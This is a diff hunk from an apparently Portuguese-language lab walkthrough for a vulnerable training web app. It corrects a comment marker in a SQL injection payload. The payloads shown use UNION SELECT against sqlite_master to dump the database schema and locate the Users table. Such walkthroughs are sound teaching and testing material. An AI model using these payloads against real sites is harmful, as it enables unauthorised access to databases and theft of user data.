@@ -218,7 +218,7 @@ orange')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master --
 ```
 O último passo é substituir o primeiro valor "1" pelo nome correto da coluna "sql".
 ``` 
-orange')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master –
+orange')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master --
 ```
 Procure no código JSON por CREATE TABLE Users.
 
